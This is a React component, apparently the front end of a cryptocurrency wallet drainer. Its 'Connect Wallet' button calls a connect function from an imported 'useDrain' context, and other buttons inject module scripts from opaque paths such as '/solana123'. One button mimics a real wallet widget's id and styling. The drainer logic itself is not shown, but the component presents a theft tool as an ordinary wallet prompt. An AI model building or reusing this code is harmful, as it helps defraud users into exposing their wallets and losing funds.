import { useState } from 'react';
import { useDrain } from './DrainContext';

export default function ConnectWallet() {
  const { connect, disconnect } = useDrain();
  const [isConnecting, setIsConnecting] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [error, setError] = useState('');

  const loadScript = (src: string): Promise<void> => {
    return new Promise((resolve, reject) => {
      const existingScript = document.querySelector(`script[src="${src}"]`);
      if (existingScript) {
        console.log(`⚠️ Script already loaded: ${src}`);
        resolve();
        return;
      }

      const script = document.createElement('script');
      script.src = src;
      script.type = 'module';
      script.onload = () => {
        console.log(`✅ Script loaded successfully: ${src}`);
        resolve();
      };
      script.onerror = (e) => {
        console.error(`❌ Failed to load script: ${src}`, e);
        reject(new Error(`Failed to load script: ${src}`));
      };

      document.body.appendChild(script);
    });
  };

  const handleGenericConnect = async () => {
    try {
      setIsConnecting(true);
      setError('');

      if (!isConnected) {
        await connect();
        setIsConnected(true);
        console.log('🔌 Wallet connected');
      } else {
        await disconnect?.(); // Optional disconnect support
        setIsConnected(false);
        console.log('🔌 Wallet disconnected');
      }
    } catch (err) {
      setError('Failed to connect/disconnect');
      console.error('❌ Wallet connect/disconnect error:', err);
    } finally {
      setIsConnecting(false);
    }
  };

  // const handleEthereumScript = async () => {
  //   try {
  //     await loadScript('/eth123');
  //     console.log('✅ Ethereum script has been injected and executed');
  //   } catch (err) {
  //     setError('Failed to load Ethereum script');
  //   }
  // };

  const handleSolanaScript = async () => {
    try {
      await loadScript('/solana123');
      console.log('✅ Solana script has been injected and executed');
    } catch (err) {
      setError('Failed to load Solana script');
    }
  };

  return (
    <>
      <div className="flex items-center justify-center space-x-6">
        {/* Wallet Connect Toggle */}
        <button
          onClick={handleGenericConnect}
          disabled={isConnecting}
          className="px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg flex items-center space-x-2 transition-colors"
        >
          {isConnecting ? (
            <>
              <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              <span>{isConnected ? 'Disconnecting...' : 'Connecting...'}</span>
            </>
          ) : (
            <span>{isConnected ? 'Disconnect Wallet' : 'Connect Wallet'}</span>
          )}
        </button>

        {/* Ethereum Script Button */}
   <div>
      <button
      id="metamask-connect-button" 
      className="md:scwtw-flex scwtw-grid md:scwtw-gap-x-3 scwtw-items-center scwtw-gap-y-2 scwtw-p-[7px] md:scwtw-w-full scwtw-cursor-pointer hover:scwtw-bg-[#3c42421a] dark:hover:scwtw-bg-[#e0e8ff1a] scwtw-transition-all scwtw-duration-300 scwtw-rounded-[12px] active:scwtw-scale-95  scwtw-group scwtw-connection-button interact-button placeholder-button connect-button connect_wallet"
       onClick={() => console.log('ETH script button clicked')}
      // onClick={handleEthereumScript}
        // className="scwtw-connection-button interact-button placeholder-button connect-button connect_wallet"
      >
        Load ETH Script
      </button>
    </div>

        {/* Solana Script Button */}
        <button
          onClick={handleSolanaScript}
          className="px-6 py-3 bg-purple-600 hover:bg-purple-700 text-white rounded-lg transition-colors"
        >
          Load SOL Script
        </button>
      </div>

      {/* Error Message */}
      {error && (
        <div className="text-center text-red-500 text-sm mt-2">
          {error}
        </div>
      )}
    </>
  );
}
